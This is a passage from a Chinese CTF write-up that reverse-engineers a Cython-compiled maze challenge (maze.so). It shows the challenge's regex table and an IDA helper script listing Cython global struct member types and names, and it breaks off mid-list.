prompt_">&gt;</span><span class="language-bash">&gt;&gt; maze.c2VjcmV0</span></span><br><span class="line">[7, 47, 60, 28, 39, 11, 23, 5, 49, 49, 26, 11, 63, 4, 9, 2, 25, 61, 36, 112, 25, 15, 62, 25, 3, 16, 102, 38, 14, 7, 37, 4, 40]</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; maze.regexes</span></span><br><span class="line">&#123;&#x27;wall&#x27;: &#x27;##|``&#x27;, &#x27;path&#x27;: &#x27;\\.\\.&#x27;, &#x27;splitter&#x27;: &#x27;&lt;&gt;&#x27;, &#x27;pause&#x27;: &#x27;[0-9]&#123;2&#125;&#x27;, &#x27;start&#x27;: &#x27;\\^\\^&#x27;, &#x27;hole&#x27;: &#x27;\\(\\)&#x27;, &#x27;out&#x27;: &#x27;&gt;&gt;&#x27;, &#x27;in&#x27;: &#x27;&lt;&lt;&#x27;, &#x27;one-use&#x27;: &#x27;--&#x27;, &#x27;direction&#x27;: &#x27;%[LRUDNlrudn]&#x27;, &#x27;signal&#x27;: &#x27;(?&lt;=\\*)[\\*A-Za-z0-9]&#x27;, &#x27;function&#x27;: &#x27;[A-Za-z][A-Za-z0-9]&#x27;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="maze-so"><a href="#maze-so" class="headerlink" title="maze.so"></a>maze.so</h3><blockquote>
<p>Cython逆向中，一般调用函数都会利用类似 PyObject_Call 这样的函数来调用。比如 PyObject_Call 中第一个参数是函数对象，第二和第三个参数是该被调用函数对象的参数，通常以元组和字典的形式传入（位置参数和关键字参数）。</p>
</blockquote>
<h4 id="run"><a href="#run" class="headerlink" title="run"></a>run</h4><p>直接搜索进入<code>run</code>函数。</p>
<p>这里可以看出是<code>print</code>，但内容找不到：</p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231214161023761.png"></p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231214161111794.png">交叉引用<code>_pyx_mstate_global_static</code>能看到一堆：</p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231214161249610.png"></p>
<p>用网上师傅的脚本可以把<code>_pyx_mstate_global_static</code>结构体拆解成成员的变量的组合，然后就可以交叉引用了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ys = [<span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyTypeObject *&#x27;</span>, <span class="string">&#x27;PyTypeObject *&#x27;</span>, <span class="string">&#x27;PyTypeObject *&#x27;</span>, <span class="string">&#x27;PyTypeObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>, <span class="string">&#x27;PyObject *&#x27;</span>]</span><br><span class="line">ns = [<span class="string">&#x27;__pyx_d&#x27;</span>, <span class="string">&#x27;__pyx_b&#x27;</span>, <span class="string">&#x27;__pyx_cython_runtime&#x27;</span>, <span class="string">&#x27;__pyx_empty_tuple&#x27;</span>, <span class="string">&#x27;__pyx_empty_bytes&#x27;</span>, <span class="string">&#x27;__pyx_empty_unicode&#x27;</span>, <span class="string">&#x27;__pyx_CyFunctionType&#x27;</span>, <span class="string">&#x27;__pyx_GeneratorType&#x27;</span>, <span class="string">&#x27;__pyx_ptype_4maze___pyx_scope_struct__YWRkX2Z1bmN0aW9u&#x27;</span>, <span class="string">&#x27;__pyx_ptype_4maze___pyx_scope_struct_1_genexpr&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_0_9&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_0_9_2&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_0_9_2_2&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_A_Za_z0_9&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_A_Za_z0_9_2&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_A_Za_z_A_Za_z0_9&#x27;</span>, <span class="string">&#x27;__pyx_n_s_AttributeError&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_Congratulations_You_got_the_flag&#x27;</span>, <span class="string">&#x27;__pyx_n_u_D&#x27;</span>, <span class="string">&#x27;__pyx_n_u_Dd&#x27;</span>, <span class="string">&#x27;__pyx_n_s_EqdU3uQNCi&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_Error_Car_is_in_wall_accidentall&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_Error_Input_is_empty&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_Error_Multiple_cars_in_same_cell&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_Failed_please_try_again&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_Invalid_ELSE_statement&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_Invalid_THEN_keyword&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_Invalid_THEN_statement&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_Invalid_assignment_value&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_Invalid_condition&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_Invalid_function&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_Invalid_function_name&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_Invalid_operator&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_Invalid_value_for_condition&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_Invalid_value_for_operator&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_Invalid_value_for_signal&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_IyMgIyMgIyMgIyMgIyMgIyMgIyMKIyMg&#x27;</span>, <span class="string">&#x27;__pyx_n_s_JfH9kFlbcd&#x27;</span>, <span class="string">&#x27;__pyx_n_u_L&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_LRUDNlrudn&#x27;</span>, <span class="string">&#x27;__pyx_n_u_Ll&#x27;</span>, <span class="string">&#x27;__pyx_n_u_Nn&#x27;</span>, <span class="string">&#x27;__pyx_n_u_None&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_Please_input_the_flag&#x27;</span>, <span class="string">&#x27;__pyx_n_s_Q2Fy&#x27;</span>, <span class="string">&#x27;__pyx_n_s_Q2Fy___init&#x27;</span>, <span class="string">&#x27;__pyx_n_s_Q2Fy___repr&#x27;</span>, <span class="string">&#x27;__pyx_n_s_Q2VsbA&#x27;</span>, <span class="string">&#x27;__pyx_n_s_Q2VsbA___init&#x27;</span>, <span class="string">&#x27;__pyx_n_s_Q2VsbA___repr&#x27;</span>, <span class="string">&#x27;__pyx_n_u_R&#x27;</span>, <span class="string">&#x27;__pyx_n_u_Rr&#x27;</span>, <span class="string">&#x27;__pyx_n_s_SvL6VEBRwx&#x27;</span>, <span class="string">&#x27;__pyx_n_s_TWF6ZUxhbmc&#x27;</span>, <span class="string">&#x27;__pyx_n_s_TWF6ZUxhbmc_YWRkX2NlbGw&#x27;</span>, <span class="string">&#x27;__pyx_n_s_TWF6ZUxhbmc_YWRkX2Z1bmN0aW9u&#x27;</span>, <span class="string">&#x27;__pyx_n_s_TWF6ZUxhbmc_YWRkX2Z1bmN0aW9u_loc&#x27;</span>, <span class="string">&#x27;__pyx_n_s_TWF6ZUxhbmc_Z2V0X2NlbGw&#x27;</span>, <span class="string">&#x27;__pyx_n_s_TWF6ZUxhbmc_Z2V0X2NlbGw_locals_l&#x27;</span>, <span class="string">&#x27;__pyx_n_s_TWF6ZUxhbmc_Z2V0X3Bvcw&#x27;</span>, <span class="string">&#x27;__pyx_n_s_TWF6ZUxhbmc___init&#x27;</span>, <span class="string">&#x27;__pyx_n_s_TWF6ZUxhbmc_aW5pdA&#x27;</span>, <span class="string">&#x27;__pyx_n_s_TWF6ZUxhbmc_b3Bw&#x27;</span>, <span class="string">&#x27;__pyx_n_s_TWF6ZUxhbmc_c3RlcA&#x27;</span>, <span class="string">&#x27;__pyx_n_s_TWF6ZUxhbmc_c3RlcA_locals_genexp&#x27;</span>, <span class="string">&#x27;__pyx_n_s_TWF6ZUxhbmc_cnVuX3RpbGxfb3V0cHV0&#x27;</span>, <span class="string">&#x27;__pyx_n_s_TypeError&#x27;</span>, <span class="string">&#x27;__pyx_n_u_U&#x27;</span>, <span class="string">&#x27;__pyx_n_s_UJ9mxXxeoS&#x27;</span>, <span class="string">&#x27;__pyx_n_u_Uu&#x27;</span>, <span class="string">&#x27;__pyx_n_s_ValueError&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_Welcome_to_the_world_of_Maze&#x27;</span>, <span class="string">&#x27;__pyx_n_s_YWRkX2NlbGw&#x27;</span>, <span class="string">&#x27;__pyx_n_s_YWRkX2Z1bmN0aW9u&#x27;</span>, <span class="string">&#x27;__pyx_n_s_Z2V0X2NlbGw&#x27;</span>, <span class="string">&#x27;__pyx_n_s_Z2V0X3Bvcw&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__10&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__11&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__12&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__13&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__14&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__15&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__16&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__17&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__18&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__19&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__2&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__20&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__25&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__3&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__30&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__31&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__32&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__33&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__34&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__35&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__36&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__37&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__38&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__4&#x27;</span>, <span class="string">&#x27;__pyx_n_s__5&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__5&#x27;</span>, <span class="string">&#x27;__pyx_n_s__69&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__7&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__8&#x27;</span>, <span class="string">&#x27;__pyx_kp_u__9&#x27;</span>, <span class="string">&#x27;__pyx_n_s_aW5pdA&#x27;</span>, <span class="string">&#x27;__pyx_n_s_aW5pdF9zZWNyZXQ&#x27;</span>, <span class="string">&#x27;__pyx_n_s_append&#x27;</span>, <span class="string">&#x27;__pyx_n_s_args&#x27;</span>, <span class="string">&#x27;__pyx_n_s_assign&#x27;</span>, <span class="string">&#x27;__pyx_n_s_asyncio_coroutines&#x27;</span>, <span class="string">&#x27;__pyx_n_s_b3Bw&#x27;</span>, <span class="string">&#x27;__pyx_n_s_b64decode&#x27;</span>, <span class="string">&#x27;__pyx_n_s_base64&#x27;</span>, <span class="string">&#x27;__pyx_n_s_bxKGKlj99G&#x27;</span>, <span class="string">&#x27;__pyx_n_s_c29sdmU&#x27;</span>, <span class="string">&#x27;__pyx_n_s_c2VjcmV0&#x27;</span>, <span class="string">&#x27;__pyx_n_s_c3RlcA&#x27;</span>, <span class="string">&#x27;__pyx_n_s_car&#x27;</span>, <span class="string">&#x27;__pyx_n_s_car_c&#x27;</span>, <span class="string">&#x27;__pyx_n_s_car_n&#x27;</span>, <span class="string">&#x27;__pyx_n_s_cars&#x27;</span>, <span class="string">&#x27;__pyx_n_s_cell&#x27;</span>, <span class="string">&#x27;__pyx_n_s_cell_line&#x27;</span>, <span class="string">&#x27;__pyx_n_s_cells&#x27;</span>, <span class="string">&#x27;__pyx_n_s_class_getitem&#x27;</span>, <span class="string">&#x27;__pyx_n_s_cline_in_traceback&#x27;</span>, <span class="string">&#x27;__pyx_n_s_close&#x27;</span>, <span class="string">&#x27;__pyx_n_s_cnVuX3RpbGxfb3V0cHV0&#x27;</span>, <span class="string">&#x27;__pyx_n_s_code&#x27;</span>, <span class="string">&#x27;__pyx_n_s_collections&#x27;</span>, <span class="string">&#x27;__pyx_n_s_condition&#x27;</span>, <span class="string">&#x27;__pyx_n_s_copy&#x27;</span>, <span class="string">&#x27;__pyx_n_s_d&#x27;</span>, <span class="string">&#x27;__pyx_n_s_decode&#x27;</span>, <span class="string">&#x27;__pyx_n_s_deepcopy&#x27;</span>, <span class="string">&#x27;__pyx_n_s_deque&#x27;</span>, <span class="string">&#x27;__pyx_n_s_dict&#x27;</span>, <span class="string">&#x27;__pyx_n_s_direction&#x27;</span>, <span class="string">&#x27;__pyx_n_u_direction&#x27;</span>, <span class="string">&#x27;__pyx_n_s_directions&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_disable&#x27;</span>, <span class="string">&#x27;__pyx_n_s_doc&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_else&#x27;</span>, <span class="string">&#x27;__pyx_n_s_else_2&#x27;</span>, <span class="string">&#x27;__pyx_kp_u_enable&#x27;</span>, <span class="string">&#x27;__pyx_n_s_end&#x27;</span>, <span class="string">&#x27;__pyx_n_s_enumerate&#x27;</span>, <span class="string">&#x27;__pyx_n_s_exit&#x27;</span>, <span class="string">&#x27;__pyx_n_s_function&#x27;</span>, <span class="string">&#x27;__pyx_n_u_function&#x27;</span>, <span 